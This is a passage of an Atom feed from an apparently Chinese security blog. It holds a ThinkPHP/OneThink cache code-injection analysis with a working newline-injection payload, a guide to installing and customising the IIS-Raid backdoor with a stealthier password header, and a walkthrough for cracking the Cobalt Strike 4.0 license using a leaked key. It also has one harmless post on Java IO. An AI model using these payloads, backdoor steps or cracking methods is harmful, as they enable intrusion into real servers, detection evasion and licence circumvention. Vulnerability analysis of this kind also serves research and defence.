				$this-&gt;error('验证码输入错误！');
			}

			/* 调用UC登录接口登录 */
			$user = new UserApi;
			$uid = $user-&gt;login($username, $password);
			if(0 &lt; $uid){ //UC登录成功
				/* 登录用户 */
				$Member = D('Member');
				if($Member-&gt;login($uid)){ //登录用户
					//TODO:跳转到登录前页面
					$this-&gt;success('登录成功！',U('Home/Index/index'));
				} else {
					$this-&gt;error($Member-&gt;getError());
				}

			} else { //登录失败
				switch($uid) {
					case -1: $error = '用户不存在或被禁用！'; break; //系统级别禁用
					case -2: $error = '密码错误！'; break;
					default: $error = '未知错误！'; break; // 0-接口参数错误（调试阶段使用）
				}
				$this-&gt;error($error);
			}

		} else { //显示登录表单
			$this-&gt;display();
		}
	}
</code></pre>
<p>跟进<code>MemberModel.class.php</code>的<code>login</code>方法</p>
<pre><code class="language-php">    public function login($uid){
        /* 检测是否在当前应用注册 */
        $user = $this-&gt;field(true)-&gt;find($uid);
        if(!$user){ //未注册
            /* 在当前应用中注册用户 */
        	$Api = new UserApi();
        	$info = $Api-&gt;info($uid);
            $user = $this-&gt;create(array('nickname' =&gt; $info[1], 'status' =&gt; 1));
            $user['uid'] = $uid;
            if(!$this-&gt;add($user)){
                $this-&gt;error = '前台用户信息注册失败，请重试！';
                return false;
            }
        } elseif(1 != $user['status']) {
            $this-&gt;error = '用户未激活或已禁用！'; //应用级别禁用
            return false;
        }

        /* 登录用户 */
        $this-&gt;autoLogin($user);

        //记录行为
        action_log('user_login', 'member', $uid, $uid);

        return true;
    }
</code></pre>
<p>这里前半部分主要是根据<code>uid</code>查询用户信息并验证是否注册和激活，然后进入<code>autoLogin</code>方法:</p>
<pre><code class="language-php">private function autoLogin($user){
        /* 更新登录信息 */
        $data = array(
            'uid'             =&gt; $user['uid'],
            'login'           =&gt; array('exp', '`login`+1'),
            'last_login_time' =&gt; NOW_TIME,
            'last_login_ip'   =&gt; get_client_ip(1),
        );
        $this-&gt;save($data);

        /* 记录登录SESSION和COOKIES */
        $auth = array(
            'uid'             =&gt; $user['uid'],
            'username'        =&gt; get_username($user['uid']),
            'last_login_time' =&gt; $user['last_login_time'],
        );

        session('user_auth', $auth);
        session('user_auth_sign', data_auth_sign($auth));

    }
</code></pre>
<p>在该方法中设置一些用户基本信息，其中<code>$auth</code>数组中的<code>username</code>字段从<code>get_username</code>方法获取，继续更新<code>get_username</code>方法，该方法在<code>Application/Common/Common/function.php</code> 中定义:</p>
<pre><code class="language-php">function get_username($uid = 0){
    static $list;
    if(!($uid &amp;&amp; is_numeric($uid))){ //获取当前登录用户名
        return session('user_auth.username');
    }

    /* 获取缓存数据 */
    if(empty($list)){
        $list = S('sys_active_user_list');
    }

    /* 查找用户信息 */
    $key = &quot;u{$uid}&quot;;
    if(isset($list[$key])){ //已缓存，直接使用
        $name = $list[$key];
    } else { //调用接口获取用户信息
        $User = new User\Api\UserApi();
        $info = $User-&gt;info($uid);
        if($info &amp;&amp; isset($info[1])){
            $name = $list[$key] = $info[1];
            /* 缓存用户 */
            $count = count($list);
            $max   = C('USER_MAX_CACHE');
            while ($count-- &gt; $max) {
                array_shift($list);
            }
            S('sys_active_user_list', $list);
        } else {
            $name = '';
        }
    }
    return $name;
}
</code></pre>
<p>可见在该方法中就有存取缓存信息的操作了，如果有缓存则直接使用，否则调用接口查询用户信息，并将用户名信息传入<code>S</code>函数创建缓存，根据<code>S</code>方法,这里还传入了个<code>sys_active_user_list</code>标识：</p>
<pre><code class="language-php">function S($name,$value='',$options=null) {
    static $cache   =   '';
    if(is_array($options) &amp;&amp; empty($cache)){
        // 缓存操作的同时初始化
        $type       =   isset($options['type'])?$options['type']:'';
        $cache      =   Think\Cache::getInstance($type,$options);
    }elseif(is_array($name)) { // 缓存初始化
        $type       =   isset($name['type'])?$name['type']:'';
        $cache      =   Think\Cache::getInstance($type,$name);
        return $cache;
    }elseif(empty($cache)) { // 自动初始化
        $cache      =   Think\Cache::getInstance();
    }
    if(''=== $value){ // 获取缓存
        return $cache-&gt;get($name);
    }elseif(is_null($value)) { // 删除缓存
        return $cache-&gt;rm($name);
    }else { // 缓存数据
        if(is_array($options)) {
            $expire     =   isset($options['expire'])?$options['expire']:NULL;
        }else{
            $expire     =   is_numeric($options)?$options:NULL;
        }
        return $cache-&gt;set($name, $value, $expire);
    }
}
</code></pre>
<p>在该函数中根据传入的<code>$name</code>(也就是字符串<code>sys_active_user_list</code>)实例化文件缓存类<code>ThinkPHP/Library/Think/Cache/Driver/File.class.php</code>，并调用<code>get</code>方法，继续跟进：</p>
<pre><code class="language-php">public function get($name) {
        $filename   =   $this-&gt;filename($name);
        if (!is_file($filename)) {
           return false;
        }
        N('cache_read',1);
        $content    =   file_get_contents($filename);
        if( false !== $content) {
            $expire  =  (int)substr($content,8, 12);
            if($expire != 0 &amp;&amp; time() &gt; filemtime($filename) + $expire) {
                //缓存过期删除缓存文件
                unlink($filename);
                return false;
            }
            if(C('DATA_CACHE_CHECK')) {//开启数据校验
                $check  =  substr($content,20, 32);
                $content   =  substr($content,52, -3);
                if($check != md5($content)) {//校验错误
                    return false;
                }
            }else {
            	$content   =  substr($content,20, -3);
            }
            if(C('DATA_CACHE_COMPRESS') &amp;&amp; function_exists('gzcompress')) {
                //启用数据压缩
                $content   =   gzuncompress($content);
            }
            $content    =   unserialize($content);
            return $content;
        }
        else {
            return false;
        }
    }
</code></pre>
<p>在该方法中首先设置缓存文件的文件名<code>$filename = $this-&gt;filename($name);</code>，<code>$name</code>值继续传递:</p>
<pre><code class="language-php">private function filename($name) {
        $name	=	md5($name);
        if(C('DATA_CACHE_SUBDIR')) {
            // 使用子目录
            $dir   ='';
            for($i=0;$i&lt;C('DATA_PATH_LEVEL');$i++) {
                $dir	.=	$name{$i}.'/';
            }
            if(!is_dir($this-&gt;options['temp'].$dir)) {
                mkdir($this-&gt;options['temp'].$dir,0755,true);
            }
            $filename	=	$dir.$this-&gt;options['prefix'].$name.'.php';
        }else{
            $filename	=	$this-&gt;options['prefix'].$name.'.php';
        }
        return $this-&gt;options['temp'].$filename;
    }
</code></pre>
<p>在该函数中还涉及到一个文件名前缀<code>$this-&gt;options['prefix']</code>的问题，在看其他人的writeup的时候有的分析里是有<code>onethink_</code>这个前缀的，而且在<code>Application/Home/Conf/config.php</code>文件中确实也配置了<code>'DATA_CACHE_PREFIX' =&gt; 'onethink_', // 缓存前缀</code>。但正确的CTF题解中却没有这个前缀，我还以为CTF使用的源码有做过更改。这个问题也让我困惑了下，直到自己动手跟代码才搞清楚。原来实际程序中<code>Application/Home/Conf/config.php</code>的<code>DATA_CACHE_PREFIX</code>配置并未覆盖系统的<code>convention.php</code>的配置，<code>convention.php</code>中的默认配置为空，所以这里缓存文件名就没有前缀了。<br>
回到正题，通过以上分析可以确定缓存文件名是一个固定值也就是<code>md5('sys_active_user_list')</code> 其值为<code>2bb202459c30a1628513f40ab22fa01a.php</code>，接下来看看如果控制写入内容。</p>
<p>在<code>S</code>函数中，未提交<code>$value</code>参数是调用文件缓存类的<code>get</code>方法取缓存，取到缓存并使用了之后再调用<code>set</code>方法写缓存。这里跟进<code>set</code>方法：</p>
<pre><code class="language-php">&lt;?
public function set($name,$value,$expire=null) {
        N('cache_write',1);
        if(is_null($expire)) {
            $expire =  $this-&gt;options['expire'];
        }
        $filename   =   $this-&gt;filename($name);
        $data   =   serialize($value);
        if( C('DATA_CACHE_COMPRESS') &amp;&amp; function_exists('gzcompress')) {
            //数据压缩
            $data   =   gzcompress($data,3);
        }
        if(C('DATA_CACHE_CHECK')) {//开启数据校验
            $check  =  md5($data);
        }else {
            $check  =  '';
        }
        $data    = &quot;&lt;?php\n//&quot;.sprintf('%012d',$expire).$check.$data.&quot;\n?&gt;&quot;;
        $result  =   file_put_contents($filename,$data);
        if($result) {
            if($this-&gt;options['length']&gt;0) {
                // 记录缓存队列
                $this-&gt;queue($name);
            }
            clearstatcache();
            return true;
        }else {
            return false;
        }
    }
    ?&gt;
</code></pre>
<p>这里将<code>$data</code>序列化之后进行字符串拼接并写入到缓存文件中，在字符串拼接中php标签后面紧跟了<code>//</code>用于注释后面的信息，默认情况下被注释的行内所有php代码都不会执行。但<code>//</code>是单行注释符，如果我们控制后面的内容能换行，则就顺利绕过这个限制了，所以在利用的过程中我们注册的时候需要使用<code>%0a</code>来绕过。<code>%0a</code>是换行符的URL编码，在提交注册和登录的时候我们提交的<code>%0a</code>还会再次被编码变成<code>%250a</code>所以这里需要进行两次解码之后还原换行符，然后提交注册或是登录，最终利用代码<code>%0aphpinfo();//</code>，后面的<code>//</code>是为了代码插入后注释掉后半部的内容，如下图：<br>
<img src="https://ca3tie1.github.io/post-images/1585925628525.png" alt="" loading="lazy"><br>
登录之后即可在生成<code>Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php</code>的缓存文件，内容如下图所示：<br>
<img src="https://ca3tie1.github.io/post-images/1585925879219.jpg" alt="" loading="lazy"><br>
访问后成功执行<code>phpinfo()</code><br>
<img src="https://ca3tie1.github.io/post-images/1585925969559.jpg" alt="" loading="lazy"></p>
<h1 id="总结">总结</h1>
<p>漏洞也是比较经典的缓存机制漏洞，分析和利用比较简单，但是挖掘这样的漏洞还是需要时间的，其中辛苦也是漏洞作者才能体会了。路漫漫其修远兮，吾将上下而求索。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[两张图总结Java中的IO流分类]]></title>
        <id>https://ca3tie1.github.io/post/java-io-tips/</id>
        <link href="https://ca3tie1.github.io/post/java-io-tips/">
        </link>
        <updated>2020-04-03T08:12:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="java-io流分类">Java IO流分类</h1>
<pre><code>1. 按照流的流向划分，可分为输入流和输出流；
2. 按照操作单元划分，可分为字节流和字符流；
3. 按照流的角色划分，可分为字节流和处理流；
</code></pre>
<p>Java Io流共涉及40多个类，这些类看上去很杂乱，但实际上很有规则，而且彼此之间存在非常紧密的联系， Java I0流的40多个类都是从如下4个抽象类基类中派生出来的。</p>
<pre><code>1. InputStream/Reader: 所有的输入流的基类，前者是字节输入流，后者是字符输入流。
2. OutputStream/Writer: 所有输出流的基类，前者是字节输出流，后者是字符输出流。
</code></pre>
<h2 id="按操作方式分类结构图">按操作方式分类结构图：</h2>
<figure data-type="image" tabindex="1"><img src="https://ca3tie1.github.io/post-images/1585901930539.jfif" alt="" loading="lazy"></figure>
<h2 id="按操作对象分类结构图">按操作对象分类结构图：</h2>
<figure data-type="image" tabindex="2"><img src="https://ca3tie1.github.io/post-images/1585901965124.jfif" alt="" loading="lazy"></figure>
<h2 id="按字符字节处理方式分">按字符字节处理方式分</h2>
<figure data-type="image" tabindex="3"><img src="https://ca3tie1.github.io/post-images/1589015986932.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[IIS Raid-使用本地模块构建的IIS后门]]></title>
        <id>https://ca3tie1.github.io/post/IIS-Raid-backdooring-iis-using-native-modules/</id>
        <link href="https://ca3tie1.github.io/post/IIS-Raid-backdooring-iis-using-native-modules/">
        </link>
        <updated>2020-03-23T13:10:57.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#0x00-%E7%AE%80%E4%BB%8B">0x00 简介</a></li>
<li><a href="#0x01-%E5%AE%89%E8%A3%85%E5%92%8C%E9%83%A8%E7%BD%B2">0x01 安装和部署</a>
<ul>
<li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AF%86%E7%A0%81%E5%AD%97%E6%AE%B5">自定义密码字段</a></li>
<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
</ul>
</li>
<li><a href="#0x02-%E4%BD%BF%E7%94%A8">0x02 使用</a></li>
<li><a href="#0x03-%E5%8F%82%E8%80%83">0x03 参考</a></li>
</ul>
</p>
<h1 id="0x00-简介">0x00 简介</h1>
<p>之前刷TW的时候在墙外看到老外分享的这款使用IIS的本地模块构建IIS后门，功能可以自定义命令执行，dumhash等。感觉不错。于是下了下来试了下，测试有一点小瑕疵，随即修改了下，原版项目地址(https://github.com/0x09AL/IIS-Raid)。</p>
<h1 id="0x01-安装和部署">0x01 安装和部署</h1>
<h2 id="自定义密码字段">自定义密码字段</h2>
<p>在使用之前你得修改默认密码，已放置别人蹭你后门。代码在<code>/module/Functions.h</code>中定义，如下：</p>
<pre><code class="language-c">// Communication Header for the Response.
#define COM_HEADER &quot;X-Chrome-Variations&quot;
#define PASS_FILE &quot;C:\\Windows\\Temp\\creds.db&quot;
#define PASSWORD &quot;SIMPLEPASS&quot;
</code></pre>
<p><code>SIMPLEPASS</code> 就是自定义的密码值，连接后门的时候在<code>HttpHeader</code>中定义，但是这里原版的定义密码的HTTP头字段始终是一个值(<code>X-Password</code>)。这无疑是一个典型的特征了，所以这里得实现自定义这个字段值，在以上定义代码中添加一个常量<code>COM_PASSWD</code>，如下代码：</p>
<pre><code class="language-c">// Communication Header for the Response.
#define COM_HEADER &quot;X-Chrome-Variations&quot;
#define COM_PASSWD &quot;X-CT-BALA&quot;
#define PASS_FILE &quot;C:\\Windows\\Temp\\creds.db&quot;
#define PASSWORD &quot;SIMPLEPASS&quot;
</code></pre>
<p>然后再更改<code>/module/HttpFactory.cpp</code>39行代码替换掉<code>X-Password</code>值为自定义的常量，如下代码：</p>
<pre><code class="language-c">// Check the header password
    USHORT uPLen = 0;
    LPCSTR lpPassword = pHttpRequest-&gt;GetHeader(COM_PASSWD, &amp;uPLen);

    if (lpPassword == NULL) {
        return RQ_NOTIFICATION_CONTINUE;
    }
    else if (strcmp(PASSWORD, lpPassword) != 0) {
        return RQ_NOTIFICATION_CONTINUE;
    }
</code></pre>
<h2 id="安装">安装</h2>
<p>安装比较简单，可以直接在命令行下使用<code>appcmd.exe</code>命令安装，命令如下：</p>
<pre><code class="language-cmd">C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:&quot;%windir%\System32\inetsrv\IIS-Backdoor.dll&quot; /add:true
</code></pre>
<p>安装成功后入下图所示：<br>
<img src="https://ca3tie1.github.io/post-images/1584970589793.png" alt="" loading="lazy"></p>
<h1 id="0x02-使用">0x02 使用</h1>
<p>客户端是py写的一个脚本，但貌似编码有点问题，运行时候回报错，需要去掉py脚本里的banner字符串就可以正常了。如果自定义了密码字段名还需要修改下脚本以便支持自定义HTTP头字段。如下图：<br>
添加个<code>--headpass</code>的命令行参数<br>
<img src="https://ca3tie1.github.io/post-images/1584971076050.jpg" alt="" loading="lazy"></p>
<p>把自定义的HTT头字段名加入到HttpHeader中<br>
<img src="https://ca3tie1.github.io/post-images/1584971210082.jpg" alt="" loading="lazy"></p>
<p>连接成功入后如下图所示：<br>
<img src="https://ca3tie1.github.io/post-images/1584971290912.png" alt="" loading="lazy"></p>
<h1 id="0x03-参考">0x03 参考</h1>
<p>原文 https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/<br>
演示 https://youtu.be/jbxEWOXecuU</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CobaltStrike4.0无Hook蛮力Cracked License思路]]></title>
        <id>https://ca3tie1.github.io/post/cobaltstrike40-wu-hook-man-li-cracked-license-si-lu/</id>
        <link href="https://ca3tie1.github.io/post/cobaltstrike40-wu-hook-man-li-cracked-license-si-lu/">
        </link>
        <updated>2020-03-21T17:02:42.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#0x00-%E5%89%8D%E8%A8%80">0x00 前言</a></li>
<li><a href="#0x01-%E5%88%9D%E6%8E%A2license">0x01 初探License</a></li>
<li><a href="#0x02-sleevesecurity">0x02 SleeveSecurity</a></li>
<li><a href="#0x03-%E5%88%9D%E8%AF%95cracked">0x03 初试Cracked</a>
<ul>
<li><a href="#%E7%96%91%E9%97%AE">疑问？</a></li>
</ul>
</li>
<li><a href="#0x04-cracked">0x04 Cracked</a>
<ul>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">使用方法</a></li>
</ul>
</li>
<li><a href="#0x05-%E6%80%BB%E7%BB%93">0x05 总结</a></li>
</ul>
</p>
<h1 id="0x00-前言">0x00 前言</h1>
<p>前两天一早起来就看到<a href="https://blog.gzsec.org/">CoolCat</a>师傅发布CobaltStrike4.0 Cracked，并附上了破解思路（<a href="https://blog.gzsec.org/post/Patch-Cobalt-Strike-4.0/">点这里</a>）。随后跟师傅要了一份原版的来也准备自己动手破解玩玩儿，经过两天折腾，在CoolCat师傅思路的基础上实现了蛮力绕过Liccense。昨晚写好了破解工具，今天上午就发现师傅们各显神通，纷纷给出了各种思路和方法。其中Frost Blue 零队微信公众发布一篇<a href="https://mp.weixin.qq.com/s/Pneu8R0zoG0ONyFXF9VLpg">Cobaltstrike 4破-解之 我自己给我自己颁发license</a>的文章，后面提到HMAC的思路和本文思路大同小异，但未给出具体的实现方式，本文算是做个补充，不到之处望师傅们多指正。该文章是直接对<code>cobaltstrike.auth</code>的加解密下手，其中对<code>AuthCrypto</code>部分的分析思路值得学习和借鉴，而我则是想直接绕过<code>cobaltstrike.auth</code>的部分来实现蛮力Cracked。</p>
<h1 id="0x01-初探license">0x01 初探License</h1>
<p>在拿到原版之前都有耳闻说是最新版的CobaltStrike的认证算法有所改变，而且看了CoolCat师傅的文章后也纳闷CoolCat师傅为何没有尝试直接蛮力破解，后来师傅告诉我实际上他也尝试过蛮力破解，但没成功，最后直接用流出的正版秘钥搞了。强迫症和好奇心推动下我决定还是尝试尝试蛮力破解方法。直接用jd-gui载入cobaltstrike.jar包直奔<code>common/Authorization.class</code>去，粗略看了一下整体代码和3.14版本差不多，然后就直接按照我上篇文章的思路来（<a href="https://blog.csdn.net/Ca3tie1/article/details/104770924">点这里</a>），注释掉<code>Authorization</code>构造函数的全部内容，把<code>watermark</code>、<code>validto</code>和<code>valid</code>写死在构造函数中（发现新版少了<code>licensekey</code>域）。简单测试下都能正常启动teamserver和GUI，等我把exit暗桩一并改了编译好测试的时候悲剧了，连接teamserver后报错，如下图：<br>
<img src="https://img-blog.csdnimg.cn/20200321133031779.png" alt="在这里插入图片描述" loading="lazy"><br>
跟了下<code>common.SleevedResource.readResource</code>的代码发现是要读取文件，再看下调用位置<code>c2profile.Preview.getPE</code><br>
<img src="https://img-blog.csdnimg.cn/20200321133450102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
发现是要读取<code>resources/beacon.dll</code>，第一反应是查看了下jar包里对应是否存在该资源，发现没有，还以为是因为不存在该资源的原因。但仔细一想也不对，如果不存在该资源那正版的怎么能正常运行呢？而且我自始至终至修改了<code>Authorization</code>和exit暗桩所在的<code>BeaconData</code>类。再仔细想和<code>BeaconData</code>的关系应该不大，可能问题还是出在修改了<code>Authorization</code>的原因，得搞清楚去读取这个dll和license有啥关系 才行，于是继续返回去仔细看了下<code>Authorization</code>的代码才发现问题之所在。<br>
<img src="https://img-blog.csdnimg.cn/20200321134710955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
发现<code>Authorization</code>比之前版本多了个<code>DataParser</code>用于解析解密<code>cobaltstrike.auth</code>后的数据的类，这部分的分析请参考上文提到Frost Blue 零队微信公众发布的文章，这里重点在后面的<code>SleevedResource.Setup(arrayOfByte);</code>。在解析解密后的<code>cobaltstrike.auth</code>数据之后传了参数<code>arrayOfByte</code>给<code>SleevedResource.Setup</code>方法。</p>
<h1 id="0x02-sleevesecurity">0x02 SleeveSecurity</h1>
<p>跟进<code>SleevedResource.Setup</code>发现调用<code>SleevedResource</code>类的构造函数并将该byte数组传递给了<code>dns.SleeveSecurity</code>的<code>registerKey</code>方法，继续跟进该方法：<br>
<img src="https://img-blog.csdnimg.cn/20200321140035327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
实话，Java渣渣刚的我刚看这部分的<code>SHA-256</code>，<code>HmacSHA256</code>确实有点懵逼，刚看到MAC这个词还以为是MAC地址呢。后来百度了下才知道是<code>Message Authentication Code</code>，HMAC则是密钥相关的哈希运算消息认证码。但这里的重点是搞清楚了的，那就是使用传递过来的byte数组内容做key，使用加密算法生成<code>key</code>和<code>hash_key</code>。搞清楚了这个再反过来看看<code>SleevedResource</code>中的<code>readResource</code>方法：<br>
<img src="https://img-blog.csdnimg.cn/20200321141137651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
这里经过<code>CommonUtils.strrep</code>替换之后实际上是读取jar包中sleeve目录下的文件，然后使用<code>SleeveSecurity</code>的<code>decrypt</code>方法进行解密，如下图：<br>
<img src="https://img-blog.csdnimg.cn/20200321141704902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
这里把读取到的dll文件分成两部分，主体部分（长度0至总长度-16）和veriKey部分（最后16位）。然后就用到了上文提到的<code>hash_key</code>，用它来对dll文件主体做doFinal操作（我也搞不懂是解密加密了。。）得到一个32位的字符串，然后取前16位与veriKey比对，比对通过后在把dll文件主体内容使用上文的<code>key</code>来解密。至此也就搞清楚了为啥我直接使用蛮力破解后连接teamserver会报错了，因为我没有使用<code>SleevedResource.Setup(arrayOfByte);</code>注册<code>key</code>和<code>hash_key</code>，造成dll文件无法正常解密，所以报错了。</p>
<h1 id="0x03-初试cracked">0x03 初试Cracked</h1>
<p>搞清楚了问题，我便尝试自己手动<code>SleevedResource.Setup(arrayOfByte);</code>注册<code>key</code>和<code>hash_key</code>，但是这个这个arrayOfByte值填什么好呢 ？我准备尝试一下，直接使用<code>SleevedResource.Setup(null);</code>，改后发现还是继续有报错，但这次报错有所不一样：<br>
<img src="https://img-blog.csdnimg.cn/202003211437263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
分析发现问题是出在veriKey比对不过，看来自己随便填肯定是不行的。思来想去我决定还是回到CoolCat师傅的思路，使用正版的秘钥来试试，看看<code>SleevedResource.Setup(arrayOfByte);</code>这个注册<code>key</code>和<code>hash_key</code>所用的<code>arryOfByte</code>值到底是什么样的。所以这里直接拿CoolCat师傅公布的byte[]值 替换掉<code>Authorization</code>类中解密<code>cobaltstrike.auth</code>文件后的<code>arrayOfByte2</code>数组，如下图：<br>
<img src="https://img-blog.csdnimg.cn/20200321144633136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
使用正版秘钥后，经过调试发现<code>SleevedResource.Setup(arrayOfByte);</code>这个注册<code>key</code>和<code>hash_key</code>所用的<code>arryOfByte</code>值实际就是<code>arrayOfByte2</code>的后16位(<code>{27,-27,-66, 82,-58,37,92,51,85,-114,-118,28,-74,103,-53,6}</code>)，而且使用正版秘钥后便能正常连接teamserver了。而且必须用正版的才行，测试上诉内容更改一位都不行。至此我也总算摸清楚新版的这个认证方式了，官方在签发正版的<code>cobaltstrike.auth</code>的时候就生成了一个秘钥或者是<code>key</code>(<code>{27,-27,-66, 82,-58,37,92,51,85,-114,-118,28,-74,103,-53,6}</code>)一并存放在<code>cobaltstrike.auth</code>文件中，然后再使用该秘钥或者是<code>key</code> 来对<code>sleeve</code>文件夹下的所有dll文件进行加密，所以客户这边必须有正版的秘钥才能正常使用。</p>
<h2 id="疑问">疑问？</h2>
<p>这里官方在签发<code>cobaltstrike.auth</code>的时候用到的这个秘钥或者是<code>key</code>是否是固定值？如果不是固定值，而是在签发的时候随机生成的话，那就意味着同样是正版在交换了jar文件之后可能就无法正常使用。若是固定值，那这个固定值会不会成为一个指纹特征，毕竟这个值是用来加密<code>sleeve</code>目录下诸如<code>mimikatz-full.x64.dll</code>这类文件，而这类文件使用的时候是要加载到目标内存中执行的。就我个人理解的话这个值应该是一个固定值，否则一人一值的话那加密后应该会影响到整个jar包的hash校验值了。不知这里的理解和分析是否有误，仅供师傅们参考和指正。</p>
<h1 id="0x04-cracked">0x04 Cracked</h1>
<p>有了以上疑问之后我还是觉得能自定义这个秘钥或是<code>key</code>实现蛮力破解是最好不过了。于是在反复研究了整个认证方式和加解密算法之后发现在<code>dns.SleeveSecurity</code>类中对应有<code>encrypt</code>方法，该方法和<code>decrypt</code>是对称的，如下图：<br>
<img src="https://img-blog.csdnimg.cn/20200321151407168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
加密方式也是使用<code>key</code>和<code>hash_key</code>，既然加密方法有了，那就好办了，灵光一闪思路就有了。我可以使用正版的秘钥先把<code>sleeve</code>下的dll文件全部解密一份，然后自定义一个16位的byte值来做<code>key</code>，然后再使用这个<code>key</code>来注册<code>key</code>和<code>hash_key</code>，再调用他的加密方法把刚解出来dll文件再重新加密，这样一来就可以在<code>Authorization</code>类的构造方法中蛮力Cracked了。实测能正常运行，dll文件的使用也没有问题，如下图<br>
<img src="https://img-blog.csdnimg.cn/20200321153531729.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NhM3RpZTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
这里为了方便写了个小工具，用来解密和加密文件(<a href="https://github.com/ca3tie1/CrackSleeve">点这里下载</a> https://github.com/ca3tie1/CrackSleeve)。</p>
<h2 id="使用方法">使用方法</h2>
<ol>
<li>将cobaltstrike.jar和CrackSleeve.java放一起</li>
<li>编译(<code>javac -encoding UTF-8 -classpath cobaltstrike.jar CrackSleeve.java</code>)</li>
<li>解密文件(<code>java -classpath cobaltstrike.jar;./ CrackSleeve decode</code>)</li>
<li>自定义16位字符串加密文件(<code>java -classpath cobaltstrike.jar;./ CrackSleeve encode CustomizeString</code>)</li>
<li>将解密后的sleeve文件夹替换jar包中的文件夹</li>
<li><code>Authorization</code>类中便可以自定义蛮力Cracked了，如下图：</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/20200321153740711.png" alt="在这里插入图片描述" loading="lazy"></figure>
<h1 id="0x05-总结">0x05 总结</h1>
<p>整体思路和个过程大致如此，不到之处师傅们多多指正。这里的关键是在于要嫖到一个正版的秘钥，这里还是需要感谢CoolCat师傅以及其他无私奉献的师傅们。其他x64无法上线的问题请参考ssooking师傅和CoolCat师傅的文章。<br>
参考链接：<br>
https://www.cnblogs.com/ssooking/p/12535998.html<br>
https://blog.gzsec.org/post/Patch-Cobalt-Strike-4.0/<br>
https://blog.gzsec.org/post/patch-cobalt-strike-40-stage-x64-bugs/</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[蹭热度分享一份写配置漏洞案例]]></title>
        <id>https://ca3tie1.github.io/post/ceng-re-du-fen-xiang-yi-fen-xie-pei-zhi-lou-dong-an-li/</id>
        <link href="https://ca3tie1.github.io/post/ceng-re-du-fen-xiang-yi-fen-xie-pei-zhi-lou-dong-an-li/">
        </link>
        <updated>2020-03-21T17:01:34.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#0x00-%E5%89%8D%E8%A8%80">0x00 前言</a></li>
<li><a href="#0x01-%E5%88%86%E6%9E%90">0x01 分析</a></li>
<li><a href="#0x02-%E5%88%A9%E7%94%A8">0x02 利用</a></li>
<li><a href="#0x03-%E7%BB%93%E8%AF%AD">0x03 结语</a></li>
</ul>
</p>
<h1 id="0x00-前言">0x00 前言</h1>
